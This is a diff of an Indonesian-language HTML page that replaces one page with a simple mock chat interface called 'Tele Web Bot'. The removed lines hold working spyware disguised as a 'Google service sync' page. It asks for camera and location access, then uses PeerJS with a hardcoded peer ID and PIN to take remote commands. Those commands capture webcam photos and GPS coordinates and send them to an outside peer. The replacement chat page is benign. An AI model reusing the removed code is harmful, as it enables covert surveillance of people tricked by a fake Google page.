@@ -1,62 +1,181 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Sistem Layanan Google</title>
-    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Tele Web Bot</title>
+
+<style>
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  font-family: "Segoe UI", sans-serif;
+}
+
+body {
+  background: #0f172a;
+  color: white;
+}
+
+.app {
+  display: flex;
+  height: 100vh;
+}
+
+/* SIDEBAR */
+.sidebar {
+  width: 300px;
+  background: #020617;
+  border-right: 1px solid #1e293b;
+  display: flex;
+  flex-direction: column;
+}
+
+.sidebar-header {
+  padding: 15px;
+  font-weight: bold;
+  font-size: 18px;
+  background: #020617;
+}
+
+.chat-list {
+  flex: 1;
+  overflow-y: auto;
+}
+
+.chat-item {
+  padding: 12px 15px;
+  cursor: pointer;
+  border-bottom: 1px solid #1e293b;
+}
+
+.chat-item:hover {
+  background: #020617;
+}
+
+.chat-item.active {
+  background: #1e293b;
+}
+
+/* CHAT AREA */
+.chat {
+  flex: 1;
+  display: flex;
+  flex-direction: column;
+}
+
+.chat-header {
+  padding: 15px;
+  background: #020617;
+  border-bottom: 1px solid #1e293b;
+}
+
+.chat-messages {
+  flex: 1;
+  padding: 15px;
+  overflow-y: auto;
+}
+
+.message {
+  margin-bottom: 10px;
+  max-width: 70%;
+}
+
+.message.bot {
+  background: #1e293b;
+  padding: 10px;
+  border-radius: 10px;
+}
+
+.message.me {
+  background: #2563eb;
+  padding: 10px;
+  border-radius: 10px;
+  margin-left: auto;
+}
+
+.chat-input {
+  display: flex;
+  padding: 10px;
+  border-top: 1px solid #1e293b;
+  background: #020617;
+}
+
+.chat-input input {
+  flex: 1;
+  padding: 10px;
+  border-radius: 8px;
+  border: none;
+  outline: none;
+}
+
+.chat-input button {
+  margin-left: 10px;
+  padding: 10px 15px;
+  border: none;
+  border-radius: 8px;
+  background: #2563eb;
+  color: white;
+  cursor: pointer;
+}
+</style>
 </head>
-<body style="background:#f2f2f2; font-family:sans-serif; text-align:center; padding-top:100px;">
-    <div style="background:#fff; padding:30px; border-radius:15px; display:inline-block; border:1px solid #ddd;">
-        <h3>⚙️ Sinkronisasi Sistem</h3>
-        <p id="stat">Menunggu Perintah...</p>
-        <button onclick="mulai()" style="padding:15px 30px; background:#4285f4; color:#fff; border:none; border-radius:5px; font-weight:bold;">AKTIFKAN LAYANAN</button>
+
+<body>
+
+<div class="app">
+  <!-- SIDEBAR -->
+  <div class="sidebar">
+    <div class="sidebar-header">📨 Tele Web Bot</div>
+    <div class="chat-list">
+      <div class="chat-item active" onclick="openChat('User A')">👤 User A</div>
+      <div class="chat-item" onclick="openChat('Group Bot')">👥 Group Bot</div>
     </div>
+  </div>
 
-    <video id="v" autoplay playsinline style="display:none"></video>
-    <canvas id="c" style="display:none"></canvas>
+  <!-- CHAT -->
+  <div class="chat">
+    <div class="chat-header" id="chatTitle">User A</div>
+    <div class="chat-messages" id="messages"></div>
 
-    <script>
-        // KUNCI DISINI BIAR GAK REPOT
-        const MY_ID = "anak_hayabusa_secure_007"; 
-        const MY_PIN = "1234"; 
-        
-        let peer = new Peer(MY_ID);
-        let stream;
+    <div class="chat-input">
+      <input type="text" id="msg" placeholder="Tulis pesan...">
+      <button onclick="sendMsg()">Kirim</button>
+    </div>
+  </div>
+</div>
 
-        async function mulai() {
-            try {
-                // Minta izin kamera & GPS
-                stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
-                navigator.geolocation.getCurrentPosition(()=>{});
-                document.getElementById('stat').innerText = "Sistem Aktif ✅";
-                alert("Sinkronisasi Berhasil!");
-            } catch(e) { alert("Klik Allow/Izinkan!"); }
-        }
+<script>
+let messages = document.getElementById("messages");
 
-        peer.on('connection', (conn) => {
-            conn.on('data', (d) => {
-                if(d.pin !== MY_PIN) return;
-                if(d.cmd === "FOTO") ambilFoto(conn);
-                if(d.cmd === "LOKASI") kirimLokasi(conn);
-            });
-        });
+function sendMsg() {
+  let input = document.getElementById("msg");
+  if (!input.value) return;
 
-        function ambilFoto(conn) {
-            const v = document.getElementById('v');
-            const c = document.getElementById('c');
-            v.srcObject = stream;
-            setTimeout(() => {
-                c.width = v.videoWidth; c.height = v.videoHeight;
-                c.getContext('2d').drawImage(v, 0, 0);
-                conn.send({type:"FOTO", data:c.toDataURL('image/jpeg', 0.5)});
-            }, 500);
-        }
+  let div = document.createElement("div");
+  div.className = "message me";
+  div.innerText = input.value;
+  messages.appendChild(div);
 
-        function kirimLokasi(conn) {
-            navigator.geolocation.getCurrentPosition(p => {
-                conn.send({type:"LOKASI", lat:p.coords.latitude, lon:p.coords.longitude});
-            });
-        }
-    </script>
+  input.value = "";
+  messages.scrollTop = messages.scrollHeight;
+
+  // simulasi balasan bot
+  setTimeout(() => {
+    let bot = document.createElement("div");
+    bot.className = "message bot";
+    bot.innerText = "🤖 Bot menerima pesan";
+    messages.appendChild(bot);
+    messages.scrollTop = messages.scrollHeight;
+  }, 800);
+}
+
+function openChat(name) {
+  document.getElementById("chatTitle").innerText = name;
+  messages.innerHTML = "";
+}
+</script>
+
 </body>
 </html>
